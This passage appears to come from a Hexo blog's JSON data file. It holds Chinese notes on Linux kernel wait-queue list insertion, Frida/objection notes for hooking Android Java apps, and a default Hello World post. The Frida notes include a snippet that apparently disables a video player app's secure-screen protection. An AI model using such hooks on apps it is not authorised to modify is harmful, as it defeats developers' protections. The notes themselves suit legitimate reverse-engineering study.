class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">before insertion:          after insertion:</span><br><span class=\"line\"></span><br><span class=\"line\">   prev ↔ next                  prev ↔ new ↔ next</span><br><span class=\"line\">    │       │                   │       │       │</span><br><span class=\"line\">    └──…───┘                   └──…───┘       └──…───┘</span><br></pre></td></tr></table></figure></li>\n</ol>\n<ul>\n<li>   步骤 1：让 next-&gt;prev = new，先把原来指向 prev 的反向指针指向新节点。</li>\n<li>   步骤 2：让 new-&gt;next = next，把新节点的“下一个”指向 next。</li>\n<li>   步骤 3：让 new-&gt;prev = prev，把新节点的“上一个”指向原来的 prev。</li>\n<li>   步骤 4：最后把 prev-&gt;next（原来指向 next）改成指向 new。</li>\n</ul>\n<ol start=\"4\">\n<li>“尾部”插入的效果<br>如果队列原来是空的,则：<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head.next == new &amp;&amp; head.prev == head</span><br></pre></td></tr></table></figure>\n插入后，head.next、head.prev 都会被更新成指向 new，形成一个单节点循环链表。</li>\n</ol>\n<ul>\n<li>如果队列不空，则把 new 串到末尾，更新前一个末尾节点的 next 和 head-&gt;prev。<br>• __add_wait_queue_entry_tail → list_add_tail → __list_add<br>• 本质上是一个带哨兵节点的双向循环链表，尾部插入就是把新节点放在哨兵之前。<br>• 指针更新分四步，保证中途链表始终有效。<br>• WRITE_ONCE 用来避免编译器或 CPU reorder，对并发场景更安全。</li>\n</ul>\n<p>通过list_head地址获取整体的结构体<br>include/linux/list.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * list_entry - get the struct for this entry</span></span><br><span class=\"line\"><span class=\"comment\"> * @ptr:\tthe &amp;struct list_head pointer.</span></span><br><span class=\"line\"><span class=\"comment\"> * @type:\tthe type of the struct this is embedded in.</span></span><br><span class=\"line\"><span class=\"comment\"> * @member:\tthe name of the list_head within the struct.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> list_entry(ptr, type, member) \\</span></span><br><span class=\"line\"><span class=\"meta\">\tcontainer_of(ptr, type, member)</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"cover":false,"excerpt":"","more":"<h2 id=\"等待队列核心结构体\"><a href=\"#等待队列核心结构体\" class=\"headerlink\" title=\"等待队列核心结构体\"></a>等待队列核心结构体</h2><p>include/linux/wait.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * A single wait-queue entry structure:</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wait_queue_entry</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span>\t\tflags;</span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t\t*private;</span><br><span class=\"line\">\t<span class=\"type\">wait_queue_func_t</span>\tfunc; <span class=\"comment\">// 回调函数，用于唤醒等待队列中的进程</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span>\t<span class=\"title\">entry</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wait_queue_head</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span>\t\tlock;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span>\t<span class=\"title\">head</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>include/linux/types.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> *<span class=\"title\">next</span>, *<span class=\"title\">prev</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"add-wait-queue-entry-tail-剖析\"><a href=\"#add-wait-queue-entry-tail-剖析\" class=\"headerlink\" title=\"__add_wait_queue_entry_tail 剖析\"></a>__add_wait_queue_entry_tail 剖析</h2><p>__add_wait_queue_entry_tail 只是把一个新的 wait_queue_entry 节点插到等待队列链表的“尾部”（即链表头部哨兵节点之前）。它的调用链和指针更新流程大致如下：</p>\n<ol>\n<li>调用点<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> __add_wait_queue_entry_tail(</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> wait_queue_head *wq_head,</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> wait_queue_entry *wq_entry)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    list_add_tail(&amp;wq_entry-&gt;entry, &amp;wq_head-&gt;head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<ul>\n<li>wq_head-&gt;head 是链表的哨兵节点（head），永远存在，不保存实际数据。</li>\n<li>wq_entry-&gt;entry 是要插入的节点的 list_head。</li>\n</ul>\n<p>2.list_add_tail</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">list_add_tail</span><span class=\"params\">(<span class=\"keyword\">struct</span> list_head *new,</span></span><br><span class=\"line\"><span class=\"params\">                                 <span class=\"keyword\">struct</span> list_head *head)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __list_add(new, head-&gt;prev, head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>head-&gt;prev：指向当前链表的最后一个真正的数据节点（如果链表为空，则 head-&gt;prev == head）。</li>\n<li>这里把新节点插到 (prev, head) 这两个节点之间。</li>\n</ul>\n<ol start=\"3\">\n<li>   __list_add 的四步指针更新<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> __list_add(<span class=\"keyword\">struct</span> list_head *new,</span><br><span class=\"line\">                              <span class=\"keyword\">struct</span> list_head *prev,</span><br><span class=\"line\">                              <span class=\"keyword\">struct</span> list_head *next)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!__list_add_valid(new, prev, next))</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    next-&gt;prev    = new;        <span class=\"comment\">// 1. 哨兵(或 next) 的 prev 指向 new</span></span><br><span class=\"line\">    new-&gt;next     = next;       <span class=\"comment\">// 2. new 的 next 指向 哨兵(或 next)</span></span><br><span class=\"line\">    new-&gt;prev     = prev;       <span class=\"comment\">// 3. new 的 prev 指向 原来的最后一个节点 prev</span></span><br><span class=\"line\">    WRITE_ONCE(prev-&gt;next, new);<span class=\"comment\">// 4. prev 的 next 原子地指向 new</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n这四步顺序非常重要，确保链表在任意时刻都保持可遍历性：<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">before insertion:          after insertion:</span><br><span class=\"line\"></span><br><span class=\"line\">   prev ↔ next                  prev ↔ new ↔ next</span><br><span class=\"line\">    │       │                   │       │       │</span><br><span class=\"line\">    └──…───┘                   └──…───┘       └──…───┘</span><br></pre></td></tr></table></figure></li>\n</ol>\n<ul>\n<li>   步骤 1：让 next-&gt;prev = new，先把原来指向 prev 的反向指针指向新节点。</li>\n<li>   步骤 2：让 new-&gt;next = next，把新节点的“下一个”指向 next。</li>\n<li>   步骤 3：让 new-&gt;prev = prev，把新节点的“上一个”指向原来的 prev。</li>\n<li>   步骤 4：最后把 prev-&gt;next（原来指向 next）改成指向 new。</li>\n</ul>\n<ol start=\"4\">\n<li>“尾部”插入的效果<br>如果队列原来是空的,则：<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head.next == new &amp;&amp; head.prev == head</span><br></pre></td></tr></table></figure>\n插入后，head.next、head.prev 都会被更新成指向 new，形成一个单节点循环链表。</li>\n</ol>\n<ul>\n<li>如果队列不空，则把 new 串到末尾，更新前一个末尾节点的 next 和 head-&gt;prev。<br>• __add_wait_queue_entry_tail → list_add_tail → __list_add<br>• 本质上是一个带哨兵节点的双向循环链表，尾部插入就是把新节点放在哨兵之前。<br>• 指针更新分四步，保证中途链表始终有效。<br>• WRITE_ONCE 用来避免编译器或 CPU reorder，对并发场景更安全。</li>\n</ul>\n<p>通过list_head地址获取整体的结构体<br>include/linux/list.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * list_entry - get the struct for this entry</span></span><br><span class=\"line\"><span class=\"comment\"> * @ptr:\tthe &amp;struct list_head pointer.</span></span><br><span class=\"line\"><span class=\"comment\"> * @type:\tthe type of the struct this is embedded in.</span></span><br><span class=\"line\"><span class=\"comment\"> * @member:\tthe name of the list_head within the struct.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> list_entry(ptr, type, member) \\</span></span><br><span class=\"line\"><span class=\"meta\">\tcontainer_of(ptr, type, member)</span></span><br></pre></td></tr></table></figure>"},{"title":"frida hook java","author":"nuoen","date":"2023-05-05T06:15:28.000Z","_content":"## objection \n* objection 附加模式hook\n\t\t在启动时hook,避免错过hook时机\n\t\tobjection -g packageName explore --startup-command \"android hooking watch\"\n\n## Frida 启动\n\n###  attach 启动\n直接附加到指定包名的应用中\n``` bash\nfrida -U com.kevin.android -l hook.js\n```\n直接附加到当前应用中\n``` bash\nfrida -UF -l hook.js\n```\n如果需要远程连接\n```\nremote device:./fs_1413_a64 -l 0.0.0.0:27042\n```\n```\nlocal device:frida-PS -H 10.200.47.99:27042\n```\n\n```python\nimport sys\nimport time\nimport frida\n\ndef on_message(message,data):\n    print(\"message\",message)\n    print(\"data\",data)\n\ndevice = frida.get_usb_device()\nsession = device.attach(\"com.kevin.demo1\")\n\nwith open(\"./demo1.js\",\"r\") as f:\n    script = session.create_script(f.read())\n\nscript.on(\"message\",on_message)\nscript.load()\nsys.stdin.read()\n```\n\n        \n``` Javascript\nfunction printJavaStack(tag) {\n    Java.perform(function () {\n        console.log(tag + \"\\n\" + Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new()));\n    });\n}\n```\n```\nJava.choose(\"com.mitv.videoplayer.fragment.InnerVideoFragment\" , {\n    onMatch : function(instance){ //This function will be called for every instance found by frida\n    console.log(\"Found instance: \"+instance);\n    console.log(\"mOnInfoListener : \" + instance.mOnInfoListener.value);\n    var runnable=DisabelSecureRunable.$new(instance);\n    instance.runOnUiThread(runnable);\n    console.log(\"stack: \"+Java.use(\"java.lang.Exception\").$new(\"Exception\").getStackTrace());            },\n    onComplete:function(){}\n});\n```\njava.choose ,只有具体的类名才会生效， 比如InnerVideoFragment 继承 VideoFragment ,找VideoFragment会找不到。\n","source":"_posts/fridaHookJava.md","raw":"title: frida hook java\nauthor: nuoen\ntags: []\ncategories:\n  - Frida\ndate: 2023-05-05 14:15:28\n---\n## objection \n* objection 附加模式hook\n\t\t在启动时hook,避免错过hook时机\n\t\tobjection -g packageName explore --startup-command \"android hooking watch\"\n\n## Frida 启动\n\n###  attach 启动\n直接附加到指定包名的应用中\n``` bash\nfrida -U com.kevin.android -l hook.js\n```\n直接附加到当前应用中\n``` bash\nfrida -UF -l hook.js\n```\n如果需要远程连接\n```\nremote device:./fs_1413_a64 -l 0.0.0.0:27042\n```\n```\nlocal device:frida-PS -H 10.200.47.99:27042\n```\n\n```python\nimport sys\nimport time\nimport frida\n\ndef on_message(message,data):\n    print(\"message\",message)\n    print(\"data\",data)\n\ndevice = frida.get_usb_device()\nsession = device.attach(\"com.kevin.demo1\")\n\nwith open(\"./demo1.js\",\"r\") as f:\n    script = session.create_script(f.read())\n\nscript.on(\"message\",on_message)\nscript.load()\nsys.stdin.read()\n```\n\n        \n``` Javascript\nfunction printJavaStack(tag) {\n    Java.perform(function () {\n        console.log(tag + \"\\n\" + Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new()));\n    });\n}\n```\n```\nJava.choose(\"com.mitv.videoplayer.fragment.InnerVideoFragment\" , {\n    onMatch : function(instance){ //This function will be called for every instance found by frida\n    console.log(\"Found instance: \"+instance);\n    console.log(\"mOnInfoListener : \" + instance.mOnInfoListener.value);\n    var runnable=DisabelSecureRunable.$new(instance);\n    instance.runOnUiThread(runnable);\n    console.log(\"stack: \"+Java.use(\"java.lang.Exception\").$new(\"Exception\").getStackTrace());            },\n    onComplete:function(){}\n});\n```\njava.choose ,只有具体的类名才会生效， 比如InnerVideoFragment 继承 VideoFragment ,找VideoFragment会找不到。\n","slug":"fridaHookJava","published":1,"updated":"2024-07-15T09:25:16.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit1000pv8fy22dtah6w","content":"<h2 id=\"objection\"><a href=\"#objection\" class=\"headerlink\" title=\"objection\"></a>objection</h2><ul>\n<li>objection 附加模式hook<pre><code>  在启动时hook,避免错过hook时机\n  objection -g packageName explore --startup-command &quot;android hooking watch&quot;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"Frida-启动\"><a href=\"#Frida-启动\" class=\"headerlink\" title=\"Frida 启动\"></a>Frida 启动</h2><h3 id=\"attach-启动\"><a href=\"#attach-启动\" class=\"headerlink\" title=\"attach 启动\"></a>attach 启动</h3><p>直接附加到指定包名的应用中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -U com.kevin.android -l hook.js</span><br></pre></td></tr></table></figure>\n<p>直接附加到当前应用中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -UF -l hook.js</span><br></pre></td></tr></table></figure>\n<p>如果需要远程连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">remote device:./fs_1413_a64 -l 0.0.0.0:27042</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local device:frida-PS -H 10.200.47.99:27042</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> frida</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">on_message</span>(<span class=\"params\">message,data</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;message&quot;</span>,message)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;data&quot;</span>,data)</span><br><span class=\"line\"></span><br><span class=\"line\">device = frida.get_usb_device()</span><br><span class=\"line\">session = device.attach(<span class=\"string\">&quot;com.kevin.demo1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./demo1.js&quot;</span>,<span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    script = session.create_script(f.read())</span><br><span class=\"line\"></span><br><span class=\"line\">script.on(<span class=\"string\">&quot;message&quot;</span>,on_message)</span><br><span class=\"line\">script.load()</span><br><span class=\"line\">sys.stdin.read()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">printJavaStack</span>(<span class=\"params\">tag</span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(tag + <span class=\"string\">&quot;\\n&quot;</span> + <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;android.util.Log&quot;</span>).<span class=\"title function_\">getStackTraceString</span>(<span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java.choose(&quot;com.mitv.videoplayer.fragment.InnerVideoFragment&quot; , &#123;</span><br><span class=\"line\">    onMatch : function(instance)&#123; //This function will be called for every instance found by frida</span><br><span class=\"line\">    console.log(&quot;Found instance: &quot;+instance);</span><br><span class=\"line\">    console.log(&quot;mOnInfoListener : &quot; + instance.mOnInfoListener.value);</span><br><span class=\"line\">    var runnable=DisabelSecureRunable.$new(instance);</span><br><span class=\"line\">    instance.runOnUiThread(runnable);</span><br><span class=\"line\">    console.log(&quot;stack: &quot;+Java.use(&quot;java.lang.Exception&quot;).$new(&quot;Exception&quot;).getStackTrace());            &#125;,</span><br><span class=\"line\">    onComplete:function()&#123;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>java.choose ,只有具体的类名才会生效， 比如InnerVideoFragment 继承 VideoFragment ,找VideoFragment会找不到。</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h2 id=\"objection\"><a href=\"#objection\" class=\"headerlink\" title=\"objection\"></a>objection</h2><ul>\n<li>objection 附加模式hook<pre><code>  在启动时hook,避免错过hook时机\n  objection -g packageName explore --startup-command &quot;android hooking watch&quot;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"Frida-启动\"><a href=\"#Frida-启动\" class=\"headerlink\" title=\"Frida 启动\"></a>Frida 启动</h2><h3 id=\"attach-启动\"><a href=\"#attach-启动\" class=\"headerlink\" title=\"attach 启动\"></a>attach 启动</h3><p>直接附加到指定包名的应用中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -U com.kevin.android -l hook.js</span><br></pre></td></tr></table></figure>\n<p>直接附加到当前应用中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -UF -l hook.js</span><br></pre></td></tr></table></figure>\n<p>如果需要远程连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">remote device:./fs_1413_a64 -l 0.0.0.0:27042</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local device:frida-PS -H 10.200.47.99:27042</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> frida</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">on_message</span>(<span class=\"params\">message,data</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;message&quot;</span>,message)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;data&quot;</span>,data)</span><br><span class=\"line\"></span><br><span class=\"line\">device = frida.get_usb_device()</span><br><span class=\"line\">session = device.attach(<span class=\"string\">&quot;com.kevin.demo1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./demo1.js&quot;</span>,<span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    script = session.create_script(f.read())</span><br><span class=\"line\"></span><br><span class=\"line\">script.on(<span class=\"string\">&quot;message&quot;</span>,on_message)</span><br><span class=\"line\">script.load()</span><br><span class=\"line\">sys.stdin.read()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">printJavaStack</span>(<span class=\"params\">tag</span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(tag + <span class=\"string\">&quot;\\n&quot;</span> + <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;android.util.Log&quot;</span>).<span class=\"title function_\">getStackTraceString</span>(<span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java.choose(&quot;com.mitv.videoplayer.fragment.InnerVideoFragment&quot; , &#123;</span><br><span class=\"line\">    onMatch : function(instance)&#123; //This function will be called for every instance found by frida</span><br><span class=\"line\">    console.log(&quot;Found instance: &quot;+instance);</span><br><span class=\"line\">    console.log(&quot;mOnInfoListener : &quot; + instance.mOnInfoListener.value);</span><br><span class=\"line\">    var runnable=DisabelSecureRunable.$new(instance);</span><br><span class=\"line\">    instance.runOnUiThread(runnable);</span><br><span class=\"line\">    console.log(&quot;stack: &quot;+Java.use(&quot;java.lang.Exception&quot;).$new(&quot;Exception&quot;).getStackTrace());            &#125;,</span><br><span class=\"line\">    onComplete:function()&#123;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>java.choose ,只有具体的类名才会生效， 比如InnerVideoFragment 继承 VideoFragment ,找VideoFragment会找不到。</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2023-12-28T12:55:47.615Z","updated":"2023-12-28T12:55:47.615Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit2000qv8fybvwj2cg2","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create 